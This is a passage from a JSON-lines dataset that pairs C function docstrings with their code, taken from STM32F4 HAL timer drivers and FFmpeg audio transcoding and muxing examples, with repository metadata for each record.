TIM_IT_TRIGGER);\n  \n  /* Disable Trigger DMA request */\n  __HAL_TIM_DISABLE_DMA(htim, TIM_DMA_TRIGGER);\n  \n  htim->State = HAL_TIM_STATE_READY;\n     \n  __HAL_UNLOCK(htim);  \n  \n  return HAL_OK;\n}", "path": "Downstream\\Drivers\\STM32F4xx_HAL_Driver\\Src\\stm32f4xx_hal_tim.c", "repo_name": "robertfisk/USG", "stars": 400, "license": "other", "language": "c", "size": 4474}
{"docstring": "/**\n  * @brief  Initializes the TIM Input Capture Channels according to the specified\n  *         parameters in the TIM_IC_InitTypeDef.\n  * @param  htim: pointer to a TIM_HandleTypeDef structure that contains\n  *                the configuration information for TIM module.\n  * @param  sConfig: TIM Input Capture configuration structure\n  * @param  Channel: TIM Channels to be enabled.\n  *          This parameter can be one of the following values:\n  *            @arg TIM_CHANNEL_1: TIM Channel 1 selected\n  *            @arg TIM_CHANNEL_2: TIM Channel 2 selected\n  *            @arg TIM_CHANNEL_3: TIM Channel 3 selected\n  *            @arg TIM_CHANNEL_4: TIM Channel 4 selected \n  * @retval HAL status\n  */\n", "func_signal": "HAL_StatusTypeDef HAL_TIM_IC_ConfigChannel(TIM_HandleTypeDef *htim, TIM_IC_InitTypeDef* sConfig, uint32_t Channel)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_TIM_CC1_INSTANCE(htim->Instance));\n  assert_param(IS_TIM_IC_POLARITY(sConfig->ICPolarity));\n  assert_param(IS_TIM_IC_SELECTION(sConfig->ICSelection));\n  assert_param(IS_TIM_IC_PRESCALER(sConfig->ICPrescaler));\n  assert_param(IS_TIM_IC_FILTER(sConfig->ICFilter));\n  \n  __HAL_LOCK(htim);\n  \n  htim->State = HAL_TIM_STATE_BUSY;\n  \n  if (Channel == TIM_CHANNEL_1)\n  {\n    /* TI1 Configuration */\n    TIM_TI1_SetConfig(htim->Instance,\n               sConfig->ICPolarity,\n               sConfig->ICSelection,\n               sConfig->ICFilter);\n               \n    /* Reset the IC1PSC Bits */\n    htim->Instance->CCMR1 &= ~TIM_CCMR1_IC1PSC;\n\n    /* Set the IC1PSC value */\n    htim->Instance->CCMR1 |= sConfig->ICPrescaler;\n  }\n  else if (Channel == TIM_CHANNEL_2)\n  {\n    /* TI2 Configuration */\n    assert_param(IS_TIM_CC2_INSTANCE(htim->Instance));\n    \n    TIM_TI2_SetConfig(htim->Instance, \n                      sConfig->ICPolarity,\n                      sConfig->ICSelection,\n                      sConfig->ICFilter);\n               \n    /* Reset the IC2PSC Bits */\n    htim->Instance->CCMR1 &= ~TIM_CCMR1_IC2PSC;\n\n    /* Set the IC2PSC value */\n    htim->Instance->CCMR1 |= (sConfig->ICPrescaler << 8);\n  }\n  else if (Channel == TIM_CHANNEL_3)\n  {\n    /* TI3 Configuration */\n    assert_param(IS_TIM_CC3_INSTANCE(htim->Instance));\n    \n    TIM_TI3_SetConfig(htim->Instance,  \n               sConfig->ICPolarity,\n               sConfig->ICSelection,\n               sConfig->ICFilter);\n               \n    /* Reset the IC3PSC Bits */\n    htim->Instance->CCMR2 &= ~TIM_CCMR2_IC3PSC;\n\n    /* Set the IC3PSC value */\n    htim->Instance->CCMR2 |= sConfig->ICPrescaler;\n  }\n  else\n  {\n    /* TI4 Configuration */\n    assert_param(IS_TIM_CC4_INSTANCE(htim->Instance));\n    \n    TIM_TI4_SetConfig(htim->Instance, \n               sConfig->ICPolarity,\n               sConfig->ICSelection,\n               sConfig->ICFilter);\n               \n    /* Reset the IC4PSC Bits */\n    htim->Instance->CCMR2 &= ~TIM_CCMR2_IC4PSC;\n\n    /* Set the IC4PSC value */\n    htim->Instance->CCMR2 |= (sConfig->ICPrescaler << 8);\n  }\n  \n  htim->State = HAL_TIM_STATE_READY;\n    \n  __HAL_UNLOCK(htim);\n  \n  return HAL_OK; \n}", "path": "Downstream\\Drivers\\STM32F4xx_HAL_Driver\\Src\\stm32f4xx_hal_tim.c", "repo_name": "robertfisk/USG", "stars": 400, "license": "other", "language": "c", "size": 4474}
{"docstring": "/**\n  * @brief  DeInitializes the TIM peripheral \n  * @param  htim: pointer to a TIM_HandleTypeDef structure that contains\n  *                the configuration information for TIM module.\n  * @retval HAL status\n  */\n", "func_signal": "HAL_StatusTypeDef HAL_TIM_IC_DeInit(TIM_HandleTypeDef *htim)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_TIM_INSTANCE(htim->Instance));\n\n  htim->State = HAL_TIM_STATE_BUSY;\n  \n  /* Disable the TIM Peripheral Clock */\n  __HAL_TIM_DISABLE(htim);\n    \n  /* DeInit the low level hardware: GPIO, CLOCK, NVIC and DMA */\n  HAL_TIM_IC_MspDeInit(htim);\n    \n  /* Change TIM state */  \n  htim->State = HAL_TIM_STATE_RESET;\n\n  /* Release Lock */\n  __HAL_UNLOCK(htim);\n\n  return HAL_OK;\n}", "path": "Downstream\\Drivers\\STM32F4xx_HAL_Driver\\Src\\stm32f4xx_hal_tim.c", "repo_name": "robertfisk/USG", "stars": 400, "license": "other", "language": "c", "size": 4474}
{"docstring": "/**\n  * @brief  DeInitializes the TIM One Pulse  \n  * @param  htim: pointer to a TIM_HandleTypeDef structure that contains\n  *                the configuration information for TIM module.\n  * @retval HAL status\n  */\n", "func_signal": "HAL_StatusTypeDef HAL_TIM_OnePulse_DeInit(TIM_HandleTypeDef *htim)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_TIM_INSTANCE(htim->Instance));\n  \n  htim->State = HAL_TIM_STATE_BUSY;\n  \n  /* Disable the TIM Peripheral Clock */\n  __HAL_TIM_DISABLE(htim);\n  \n  /* DeInit the low level hardware: GPIO, CLOCK, NVIC */\n  HAL_TIM_OnePulse_MspDeInit(htim);\n    \n  /* Change TIM state */  \n  htim->State = HAL_TIM_STATE_RESET;\n\n  /* Release Lock */\n  __HAL_UNLOCK(htim);\n\n  return HAL_OK;\n}", "path": "Downstream\\Drivers\\STM32F4xx_HAL_Driver\\Src\\stm32f4xx_hal_tim.c", "repo_name": "robertfisk/USG", "stars": 400, "license": "other", "language": "c", "size": 4474}
{"docstring": "/**\n  * @brief  Initializes the TIM PWM  channels according to the specified\n  *         parameters in the TIM_OC_InitTypeDef.\n  * @param  htim: pointer to a TIM_HandleTypeDef structure that contains\n  *                the configuration information for TIM module.\n  * @param  sConfig: TIM PWM configuration structure\n  * @param  Channel: TIM Channels to be enabled.\n  *          This parameter can be one of the following values:\n  *            @arg TIM_CHANNEL_1: TIM Channel 1 selected\n  *            @arg TIM_CHANNEL_2: TIM Channel 2 selected\n  *            @arg TIM_CHANNEL_3: TIM Channel 3 selected\n  *            @arg TIM_CHANNEL_4: TIM Channel 4 selected\n  * @retval HAL status\n  */\n", "func_signal": "HAL_StatusTypeDef HAL_TIM_PWM_ConfigChannel(TIM_HandleTypeDef *htim, TIM_OC_InitTypeDef* sConfig, uint32_t Channel)", "code": "{\n  __HAL_LOCK(htim);\n  \n  /* Check the parameters */ \n  assert_param(IS_TIM_CHANNELS(Channel)); \n  assert_param(IS_TIM_PWM_MODE(sConfig->OCMode));\n  assert_param(IS_TIM_OC_POLARITY(sConfig->OCPolarity));\n  assert_param(IS_TIM_OCN_POLARITY(sConfig->OCNPolarity));\n  assert_param(IS_TIM_OCNIDLE_STATE(sConfig->OCNIdleState));\n  assert_param(IS_TIM_OCIDLE_STATE(sConfig->OCIdleState));\n  assert_param(IS_TIM_FAST_STATE(sConfig->OCFastMode));\n\n  htim->State = HAL_TIM_STATE_BUSY;\n    \n  switch (Channel)\n  {\n    case TIM_CHANNEL_1:\n    {\n      assert_param(IS_TIM_CC1_INSTANCE(htim->Instance));\n      /* Configure the Channel 1 in PWM mode */\n      TIM_OC1_SetConfig(htim->Instance, sConfig);\n      \n      /* Set the Preload enable bit for channel1 */\n      htim->Instance->CCMR1 |= TIM_CCMR1_OC1PE;\n      \n      /* Configure the Output Fast mode */\n      htim->Instance->CCMR1 &= ~TIM_CCMR1_OC1FE;\n      htim->Instance->CCMR1 |= sConfig->OCFastMode;\n    }\n    break;\n    \n    case TIM_CHANNEL_2:\n    {\n      assert_param(IS_TIM_CC2_INSTANCE(htim->Instance));\n      /* Configure the Channel 2 in PWM mode */\n      TIM_OC2_SetConfig(htim->Instance, sConfig);\n      \n      /* Set the Preload enable bit for channel2 */\n      htim->Instance->CCMR1 |= TIM_CCMR1_OC2PE;\n      \n      /* Configure the Output Fast mode */\n      htim->Instance->CCMR1 &= ~TIM_CCMR1_OC2FE;\n      htim->Instance->CCMR1 |= sConfig->OCFastMode << 8;\n    }\n    break;\n    \n    case TIM_CHANNEL_3:\n    {\n      assert_param(IS_TIM_CC3_INSTANCE(htim->Instance));\n      /* Configure the Channel 3 in PWM mode */\n      TIM_OC3_SetConfig(htim->Instance, sConfig);\n      \n      /* Set the Preload enable bit for channel3 */\n      htim->Instance->CCMR2 |= TIM_CCMR2_OC3PE;\n      \n     /* Configure the Output Fast mode */\n      htim->Instance->CCMR2 &= ~TIM_CCMR2_OC3FE;\n      htim->Instance->CCMR2 |= sConfig->OCFastMode;  \n    }\n    break;\n    \n    case TIM_CHANNEL_4:\n    {\n      assert_param(IS_TIM_CC4_INSTANCE(htim->Instance));\n      /* Configure the Channel 4 in PWM mode */\n      TIM_OC4_SetConfig(htim->Instance, sConfig);\n      \n      /* Set the Preload enable bit for channel4 */\n      htim->Instance->CCMR2 |= TIM_CCMR2_OC4PE;\n      \n     /* Configure the Output Fast mode */\n      htim->Instance->CCMR2 &= ~TIM_CCMR2_OC4FE;\n      htim->Instance->CCMR2 |= sConfig->OCFastMode << 8;  \n    }\n    break;\n    \n    default:\n    break;    \n  }\n  \n  htim->State = HAL_TIM_STATE_READY;\n    \n  __HAL_UNLOCK(htim);\n  \n  return HAL_OK;\n}", "path": "Downstream\\Drivers\\STM32F4xx_HAL_Driver\\Src\\stm32f4xx_hal_tim.c", "repo_name": "robertfisk/USG", "stars": 400, "license": "other", "language": "c", "size": 4474}
{"docstring": "/** Initialize one data packet for reading or writing. */\n", "func_signal": "static void init_packet(AVPacket *packet)", "code": "{\n    av_init_packet(packet);\n    /** Set the packet data and size so that it is recognized as being empty. */\n    packet->data = NULL;\n    packet->size = 0;\n}", "path": "build_static_lib\\ffmpeg\\arm64-v8a\\share\\ffmpeg\\examples\\transcode_aac.c", "repo_name": "yangkun19921001/AVSample", "stars": 372, "license": "None", "language": "c", "size": 24236}
{"docstring": "/** Encode one frame worth of audio to the output file. */\n", "func_signal": "static int encode_audio_frame(AVFrame *frame,\n                              AVFormatContext *output_format_context,\n                              AVCodecContext *output_codec_context,\n                              int *data_present)", "code": "{\n    /** Packet used for temporary storage. */\n    AVPacket output_packet;\n    int error;\n    init_packet(&output_packet);\n\n    /** Set a timestamp based on the sample rate for the container. */\n    if (frame) {\n        frame->pts = pts;\n        pts += frame->nb_samples;\n    }\n\n    /**\n     * Encode the audio frame and store it in the temporary packet.\n     * The output audio stream encoder is used to do this.\n     */\n    if ((error = avcodec_encode_audio2(output_codec_context, &output_packet,\n                                       frame, data_present)) < 0) {\n        fprintf(stderr, \"Could not encode frame (error '%s')\\n\",\n                av_err2str(error));\n        av_packet_unref(&output_packet);\n        return error;\n    }\n\n    /** Write one audio frame from the temporary packet to the output file. */\n    if (*data_present) {\n        if ((error = av_write_frame(output_format_context, &output_packet)) < 0) {\n            fprintf(stderr, \"Could not write frame (error '%s')\\n\",\n                    av_err2str(error));\n            av_packet_unref(&output_packet);\n            return error;\n        }\n\n        av_packet_unref(&output_packet);\n    }\n\n    return 0;\n}", "path": "build_static_lib\\ffmpeg\\arm64-v8a\\share\\ffmpeg\\examples\\transcode_aac.c", "repo_name": "yangkun19921001/AVSample", "stars": 372, "license": "None", "language": "c", "size": 24236}
{"docstring": "/* Prepare a dummy image. */\n", "func_signal": "static void fill_yuv_image(AVFrame *pict, int frame_index,\n                           int width, int height)", "code": "{\n    int x, y, i;\n\n    i = frame_index;\n\n    /* Y */\n    for (y = 0; y < height; y++)\n        for (x = 0; x < width; x++)\n            pict->data[0][y * pict->linesize[0] + x] = x + y + i * 3;\n\n    /* Cb and Cr */\n    for (y = 0; y < height / 2; y++) {\n        for (x = 0; x < width / 2; x++) {\n            pict->data[1][y * pict->linesize[1] + x] = 128 + y + i * 2;\n            pict->data[2][y * pict->linesize[2] + x] = 64 + x + i * 5;\n        }\n    }\n}", "path": "build_static_lib\\ffmpeg\\arm64-v8a\\share\\ffmpeg\\examples\\muxing.c", "repo_name": "yangkun19921001/AVSample", "stars": 372, "license": "None", "language": "c", "size": 24236}
{"docstring": "/** Initialize a FIFO buffer for the audio samples to be encoded. */\n", "func_signal": "static int init_fifo(AVAudioFifo **fifo, AVCodecContext *output_codec_context)", "code": "{\n    /** Create the FIFO buffer based on the specified output sample format. */\n    if (!(*fifo = av_audio_fifo_alloc(output_codec_context->sample_fmt,\n                                      output_codec_context->channels, 1))) {\n        fprintf(stderr, \"Could not allocate FIFO\\n\");\n        return AVERROR(ENOMEM);\n    }\n    return 0;\n}", "path": "build_static_lib\\ffmpeg\\arm64-v8a\\share\\ffmpeg\\examples\\transcode_aac.c", "repo_name": "yangkun19921001/AVSample", "stars": 372, "license": "None", "language": "c", "size": 24236}
{"docstring": "/** Convert an audio file to an AAC file in an MP4 container. */\n", "func_signal": "int main(int argc, char **argv)", "code": "{\n    AVFormatContext *input_format_context = NULL, *output_format_context = NULL;\n    AVCodecContext *input_codec_context = NULL, *output_codec_context = NULL;\n    SwrContext *resample_context = NULL;\n    AVAudioFifo *fifo = NULL;\n    int ret = AVERROR_EXIT;\n\n    if (argc < 3) {\n        fprintf(stderr, \"Usage: %s <input file> <output file>\\n\", argv[0]);\n        exit(1);\n    }\n\n    /** Register all codecs and formats so that they can be used. */\n    av_register_all();\n    /** Open the input file for reading. */\n    if (open_input_file(argv[1], &input_format_context,\n                        &input_codec_context))\n        goto cleanup;\n    /** Open the output file for writing. */\n    if (open_output_file(argv[2], input_codec_context,\n                         &output_format_context, &output_codec_context))\n        goto cleanup;\n    /** Initialize the resampler to be able to convert audio sample formats. */\n    if (init_resampler(input_codec_context, output_codec_context,\n                       &resample_context))\n        goto cleanup;\n    /** Initialize the FIFO buffer to store audio samples to be encoded. */\n    if (init_fifo(&fifo, output_codec_context))\n        goto cleanup;\n    /** Write the header of the output file container. */\n    if (write_output_file_header(output_format_context))\n        goto cleanup;\n\n    /**\n     * Loop as long as we have input samples to read or output samples\n     * to write; abort as soon as we have neither.\n     */\n    while (1) {\n        /** Use the encoder's desired frame size for processing. */\n        const int output_frame_size = output_codec_context->frame_size;\n        int finished                = 0;\n\n        /**\n         * Make sure that there is one frame worth of samples in the FIFO\n         * buffer so that the encoder can do its work.\n         * Since the decoder's and the encoder's frame size may differ, we\n         * need to FIFO buffer to store as many frames worth of input samples\n         * that they make up at least one frame worth of output samples.\n         */\n        while (av_audio_fifo_size(fifo) < output_frame_size) {\n            /**\n             * Decode one frame worth of audio samples, convert it to the\n             * output sample format and put it into the FIFO buffer.\n             */\n            if (read_decode_convert_and_store(fifo, input_format_context,\n                                              input_codec_context,\n                                              output_codec_context,\n                                              resample_context, &finished))\n                goto cleanup;\n\n            /**\n             * If we are at the end of the input file, we continue\n             * encoding the remaining audio samples to the output file.\n             */\n            if (finished)\n                break;\n        }\n\n        /**\n         * If we have enough samples for the encoder, we encode them.\n         * At the end of the file, we pass the remaining samples to\n         * the encoder.\n         */\n        while (av_audio_fifo_size(fifo) >= output_frame_size ||\n               (finished && av_audio_fifo_size(fifo) > 0))\n            /**\n             * Take one frame worth of audio samples from the FIFO buffer,\n             * encode it and write it to the output file.\n             */\n            if (load_encode_and_write(fifo, output_format_context,\n                                      output_codec_context))\n                goto cleanup;\n\n        /**\n         * If we are at the end of the input file and have encoded\n         * all remaining samples, we can exit this loop and finish.\n         */\n        if (finished) {\n            int data_written;\n            /** Flush the encoder as it may have delayed frames. */\n            do {\n                if (encode_audio_frame(NULL, output_format_context,\n                                       output_codec_context, &data_written))\n                    goto cleanup;\n            } while (data_written);\n            break;\n        }\n    }\n\n    /** Write the trailer of the output file container. */\n    if (write_output_file_trailer(output_format_context))\n        goto cleanup;\n    ret = 0;\n\ncleanup:\n    if (fifo)\n        av_audio_fifo_free(fifo);\n    swr_free(&resample_context);\n    if (output_codec_context)\n        avcodec_free_context(&output_codec_context);\n    if (output_format_context) {\n        avio_closep(&output_format_context->pb);\n        avformat_free_context(output_format_context);\n    }\n    if (input_codec_context)\n        avcodec_free_context(&input_codec_context);\n    if (input_format_context)\n        avformat_close_input(&input_format_context);\n\n    return ret;\n}", "path": "build_static_lib\\ffmpeg\\arm64-v8a\\share\\ffmpeg\\examples\\transcode_aac.c", "repo_name": "yangkun19921001/AVSample", "stars": 372, "license": "None", "language": "c", "size": 24236}
{"docstring": "/**\n * Load one audio frame from the FIFO buffer, encode and write it to the\n * output file.\n */\n", "func_signal": "static int load_encode_and_write(AVAudioFifo *fifo,\n                                 AVFormatContext *output_format_context,\n                                 AVCodecContext *output_codec_context)", "code": "{\n    /** Temporary storage of the output samples of the frame written to the file. */\n    AVFrame *output_frame;\n    /**\n     * Use the maximum number of possible samples per frame.\n     * If there is less than the maximum possible frame size in the FIFO\n     * buffer use this number. Otherwise, use the maximum possible frame size\n     */\n    const int frame_size = FFMIN(av_audio_fifo_size(fifo),\n                                 output_codec_context->frame_size);\n    int data_written;\n\n    /** Initialize temporary storage for one output frame. */\n    if (init_output_frame(&output_frame, output_codec_context, frame_size))\n        return AVERROR_EXIT;\n\n    /**\n     * Read as many samples from the FIFO buffer as required to fill the frame.\n     * The samples are stored in the frame temporarily.\n     */\n    if (av_audio_fifo_read(fifo, (void **)output_frame->data, frame_size) < frame_size) {\n        fprintf(stderr, \"Could not read data from FIFO\\n\");\n        av_frame_free(&output_frame);\n        return AVERROR_EXIT;\n    }\n\n    /** Encode one frame worth of audio samples. */\n    if (encode_audio_frame(output_frame, output_format_context,\n                           output_codec_context, &data_written)) {\n        av_frame_free(&output_frame);\n        return AVERROR_EXIT;\n    }\n    av_frame_free(&output_frame);\n    return 0;\n}", "path": "build_static_lib\\ffmpeg\\arm64-v8a\\share\\ffmpeg\\examples\\transcode_aac.c", "repo_name": "yangkun19921001/AVSample", "stars": 372, "license": "None", "language": "c", "size": 24236}
{"docstring": "/**************************************************************/\n/* audio output */\n", "func_signal": "static AVFrame *alloc_audio_frame(enum AVSampleFormat sample_fmt,\n                                  uint64_t channel_layout,\n                                  int sample_rate, int nb_samples)", "code": "{\n    AVFrame *frame = av_frame_alloc();\n    int ret;\n\n    if (!frame) {\n        fprintf(stderr, \"Error allocating an audio frame\\n\");\n        exit(1);\n    }\n\n    frame->format = sample_fmt;\n    frame->channel_layout = channel_layout;\n    frame->sample_rate = sample_rate;\n    frame->nb_samples = nb_samples;\n\n    if (nb_samples) {\n        ret = av_frame_get_buffer(frame, 0);\n        if (ret < 0) {\n            fprintf(stderr, \"Error allocating an audio buffer\\n\");\n            exit(1);\n        }\n    }\n\n    return frame;\n}", "path": "build_static_lib\\ffmpeg\\arm64-v8a\\share\\ffmpeg\\examples\\muxing.c", "repo_name": "yangkun19921001/AVSample", "stars": 372, "license": "None", "language": "c", "size": 24236}
{"docstring": "/*\n * encode one audio frame and send it to the muxer\n * return 1 when encoding is finished, 0 otherwise\n */\n", "func_signal": "static int write_audio_frame(AVFormatContext *oc, OutputStream *ost)", "code": "{\n    AVCodecContext *c;\n    AVPacket pkt = { 0 }; // data and size must be 0;\n    AVFrame *frame;\n    int ret;\n    int got_packet;\n    int dst_nb_samples;\n\n    av_init_packet(&pkt);\n    c = ost->enc;\n\n    frame = get_audio_frame(ost);\n\n    if (frame) {\n        /* convert samples from native format to destination codec format, using the resampler */\n            /* compute destination number of samples */\n            dst_nb_samples = av_rescale_rnd(swr_get_delay(ost->swr_ctx, c->sample_rate) + frame->nb_samples,\n                                            c->sample_rate, c->sample_rate, AV_ROUND_UP);\n            av_assert0(dst_nb_samples == frame->nb_samples);\n\n        /* when we pass a frame to the encoder, it may keep a reference to it\n         * internally;\n         * make sure we do not overwrite it here\n         */\n        ret = av_frame_make_writable(ost->frame);\n        if (ret < 0)\n            exit(1);\n\n        /* convert to destination format */\n        ret = swr_convert(ost->swr_ctx,\n                          ost->frame->data, dst_nb_samples,\n                          (const uint8_t **)frame->data, frame->nb_samples);\n        if (ret < 0) {\n            fprintf(stderr, \"Error while converting\\n\");\n            exit(1);\n        }\n        frame = ost->frame;\n\n        frame->pts = av_rescale_q(ost->samples_count, (AVRational){1, c->sample_rate}, c->time_base);\n        ost->samples_count += dst_nb_samples;\n    }\n\n    ret = avcodec_encode_audio2(c, &pkt, frame, &got_packet);\n    if (ret < 0) {\n        fprintf(stderr, \"Error encoding audio frame: %s\\n\", av_err2str(ret));\n        exit(1);\n    }\n\n    if (got_packet) {\n        ret = write_frame(oc, &c->time_base, ost->st, &pkt);\n        if (ret < 0) {\n            fprintf(stderr, \"Error while writing audio frame: %s\\n\",\n                    av_err2str(ret));\n            exit(1);\n        }\n    }\n\n    return (frame || got_packet) ? 0 : 1;\n}", "path": "build_static_lib\\ffmpeg\\arm64-v8a\\share\\ffmpeg\\examples\\muxing.c", "repo_name": "yangkun19921001/AVSample", "stars": 372, "license": "None", "language": "c", "size": 24236}
{"docstring": "/* check that a given sample format is supported by the encoder */\n", "func_signal": "static int check_sample_fmt(const AVCodec *codec, enum AVSampleFormat sample_fmt)", "code": "{\n    const enum AVSampleFormat *p = codec->sample_fmts;\n\n    while (*p != AV_SAMPLE_FMT_NONE) {\n        if (*p == sample_fmt)\n            return 1;\n        p++;\n    }\n    return 0;\n}", "path": "build_static_lib\\ffmpeg\\armeabi-v7a\\share\\ffmpeg\\examples\\encode_audio.c", "repo_name": "yangkun19921001/AVSample", "stars": 372, "license": "None", "language": "c", "size": 24236}
{"docstring": "/* Prepare a 16 bit dummy audio frame of 'frame_size' samples and\n * 'nb_channels' channels. */\n", "func_signal": "static AVFrame *get_audio_frame(OutputStream *ost)", "code": "{\n    AVFrame *frame = ost->tmp_frame;\n    int j, i, v;\n    int16_t *q = (int16_t*)frame->data[0];\n\n    /* check if we want to generate more frames */\n    if (av_compare_ts(ost->next_pts, ost->enc->time_base,\n                      STREAM_DURATION, (AVRational){ 1, 1 }) >= 0)\n        return NULL;\n\n    for (j = 0; j <frame->nb_samples; j++) {\n        v = (int)(sin(ost->t) * 10000);\n        for (i = 0; i < ost->enc->channels; i++)\n            *q++ = v;\n        ost->t     += ost->tincr;\n        ost->tincr += ost->tincr2;\n    }\n\n    frame->pts = ost->next_pts;\n    ost->next_pts  += frame->nb_samples;\n\n    return frame;\n}", "path": "build_static_lib\\ffmpeg\\arm64-v8a\\share\\ffmpeg\\examples\\muxing.c", "repo_name": "yangkun19921001/AVSample", "stars": 372, "license": "None", "language": "c", "size": 24236}
{"docstring": "/**\n * Read one audio frame from the input file, decodes, converts and stores\n * it in the FIFO buffer.\n */\n", "func_signal": "static int read_decode_convert_and_store(AVAudioFifo *fifo,\n                                         AVFormatContext *input_format_context,\n                                         AVCodecContext *input_codec_context,\n                                         AVCodecContext *output_codec_context,\n                                         SwrContext *resampler_context,\n                                         int *finished)", "code": "{\n    /** Temporary storage of the input samples of the frame read from the file. */\n    AVFrame *input_frame = NULL;\n    /** Temporary storage for the converted input samples. */\n    uint8_t **converted_input_samples = NULL;\n    int data_present;\n    int ret = AVERROR_EXIT;\n\n    /** Initialize temporary storage for one input frame. */\n    if (init_input_frame(&input_frame))\n        goto cleanup;\n    /** Decode one frame worth of audio samples. */\n    if (decode_audio_frame(input_frame, input_format_context,\n                           input_codec_context, &data_present, finished))\n        goto cleanup;\n    /**\n     * If we are at the end of the file and there are no more samples\n     * in the decoder which are delayed, we are actually finished.\n     * This must not be treated as an error.\n     */\n    if (*finished && !data_present) {\n        ret = 0;\n        goto cleanup;\n    }\n    /** If there is decoded data, convert and store it */\n    if (data_present) {\n        /** Initialize the temporary storage for the converted input samples. */\n        if (init_converted_samples(&converted_input_samples, output_codec_context,\n                                   input_frame->nb_samples))\n            goto cleanup;\n\n        /**\n         * Convert the input samples to the desired output sample format.\n         * This requires a temporary storage provided by converted_input_samples.\n         */\n        if (convert_samples((const uint8_t**)input_frame->extended_data, converted_input_samples,\n                            input_frame->nb_samples, resampler_context))\n            goto cleanup;\n\n        /** Add the converted input samples to the FIFO buffer for later processing. */\n        if (add_samples_to_fifo(fifo, converted_input_samples,\n                                input_frame->nb_samples))\n            goto cleanup;\n        ret = 0;\n    }\n    ret = 0;\n\ncleanup:\n    if (converted_input_samples) {\n        av_freep(&converted_input_samples[0]);\n        free(converted_input_samples);\n    }\n    av_frame_free(&input_frame);\n\n    return ret;\n}", "path": "build_static_lib\\ffmpeg\\arm64-v8a\\share\\ffmpeg\\examples\\transcode_aac.c", "repo_name": "yangkun19921001/AVSample", "stars": 372, "license": "None", "language": "c", "size": 24236}
{"docstring": "/* select layout with the highest channel count */\n", "func_signal": "static int select_channel_layout(const AVCodec *codec)", "code": "{\n    const uint64_t *p;\n    uint64_t best_ch_layout = 0;\n    int best_nb_channels   = 0;\n\n    if (!codec->channel_layouts)\n        return AV_CH_LAYOUT_STEREO;\n\n    p = codec->channel_layouts;\n    while (*p) {\n        int nb_channels = av_get_channel_layout_nb_channels(*p);\n\n        if (nb_channels > best_nb_channels) {\n            best_ch_layout    = *p;\n            best_nb_channels = nb_channels;\n        }\n        p++;\n    }\n    return best_ch_layout;\n}", "path": "build_static_lib\\ffmpeg\\armeabi-v7a\\share\\ffmpeg\\examples\\encode_audio.c", "repo_name": "yangkun19921001/AVSample", "stars": 372, "license": "None", "language": "c", "size": 24236}
{"docstring": "/** Decode one audio frame from the input file. */\n", "func_signal": "static int decode_audio_frame(AVFrame *frame,\n                              AVFormatContext *input_format_context,\n                              AVCodecContext *input_codec_context,\n                              int *data_present, int *finished)", "code": "{\n    /** Packet used for temporary storage. */\n    AVPacket input_packet;\n    int error;\n    init_packet(&input_packet);\n\n    /** Read one audio frame from the input file into a temporary packet. */\n    if ((error = av_read_frame(input_format_context, &input_packet)) < 0) {\n        /** If we are at the end of the file, flush the decoder below. */\n        if (error == AVERROR_EOF)\n            *finished = 1;\n        else {\n            fprintf(stderr, \"Could not read frame (error '%s')\\n\",\n                    av_err2str(error));\n            return error;\n        }\n    }\n\n    /**\n     * Decode the audio frame stored in the temporary packet.\n     * The input audio stream decoder is used to do this.\n     * If we are at the end of the file, pass an empty packet to the decoder\n     * to flush it.\n     */\n    if ((error = avcodec_decode_audio4(input_codec_context, frame,\n                                       data_present, &input_packet)) < 0) {\n        fprintf(stderr, \"Could not decode frame (error '%s')\\n\",\n                av_err2str(error));\n        av_packet_unref(&input_packet);\n        return error;\n    }\n\n    /**\n     * If the decoder has not been flushed completely, we are not finished,\n     * so that this function has to be called again.\n     */\n    if (*finished && *data_present)\n        *finished = 0;\n    av_packet_unref(&input_packet);\n    return 0;\n}", "path": "build_static_lib\\ffmpeg\\arm64-v8a\\share\\ffmpeg\\examples\\transcode_aac.c", "repo_name": "yangkun19921001/AVSample", "stars": 372, "license": "None", "language": "c", "size": 24236}
{"docstring": "/**\n * Open an output file and the required encoder.\n * Also set some basic encoder parameters.\n * Some of these parameters are based on the input file's parameters.\n */\n", "func_signal": "static int open_output_file(const char *filename,\n                            AVCodecContext *input_codec_context,\n                            AVFormatContext **output_format_context,\n                            AVCodecContext **output_codec_context)", "code": "{\n    AVCodecContext *avctx          = NULL;\n    AVIOContext *output_io_context = NULL;\n    AVStream *stream               = NULL;\n    AVCodec *output_codec          = NULL;\n    int error;\n\n    /** Open the output file to write to it. */\n    if ((error = avio_open(&output_io_context, filename,\n                           AVIO_FLAG_WRITE)) < 0) {\n        fprintf(stderr, \"Could not open output file '%s' (error '%s')\\n\",\n                filename, av_err2str(error));\n        return error;\n    }\n\n    /** Create a new format context for the output container format. */\n    if (!(*output_format_context = avformat_alloc_context())) {\n        fprintf(stderr, \"Could not allocate output format context\\n\");\n        return AVERROR(ENOMEM);\n    }\n\n    /** Associate the output file (pointer) with the container format context. */\n    (*output_format_context)->pb = output_io_context;\n\n    /** Guess the desired container format based on the file extension. */\n    if (!((*output_format_context)->oformat = av_guess_format(NULL, filename,\n                                                              NULL))) {\n        fprintf(stderr, \"Could not find output file format\\n\");\n        goto cleanup;\n    }\n\n    av_strlcpy((*output_format_context)->filename, filename,\n               sizeof((*output_format_context)->filename));\n\n    /** Find the encoder to be used by its name. */\n    if (!(output_codec = avcodec_find_encoder(AV_CODEC_ID_AAC))) {\n        fprintf(stderr, \"Could not find an AAC encoder.\\n\");\n        goto cleanup;\n    }\n\n    /** Create a new audio stream in the output file container. */\n    if (!(stream = avformat_new_stream(*output_format_context, NULL))) {\n        fprintf(stderr, \"Could not create new stream\\n\");\n        error = AVERROR(ENOMEM);\n        goto cleanup;\n    }\n\n    avctx = avcodec_alloc_context3(output_codec);\n    if (!avctx) {\n        fprintf(stderr, \"Could not allocate an encoding context\\n\");\n        error = AVERROR(ENOMEM);\n        goto cleanup;\n    }\n\n    /**\n     * Set the basic encoder parameters.\n     * The input file's sample rate is used to avoid a sample rate conversion.\n     */\n    avctx->channels       = OUTPUT_CHANNELS;\n    avctx->channel_layout = av_get_default_channel_layout(OUTPUT_CHANNELS);\n    avctx->sample_rate    = input_codec_context->sample_rate;\n    avctx->sample_fmt     = output_codec->sample_fmts[0];\n    avctx->bit_rate       = OUTPUT_BIT_RATE;\n\n    /** Allow the use of the experimental AAC encoder */\n    avctx->strict_std_compliance = FF_COMPLIANCE_EXPERIMENTAL;\n\n    /** Set the sample rate for the container. */\n    stream->time_base.den = input_codec_context->sample_rate;\n    stream->time_base.num = 1;\n\n    /**\n     * Some 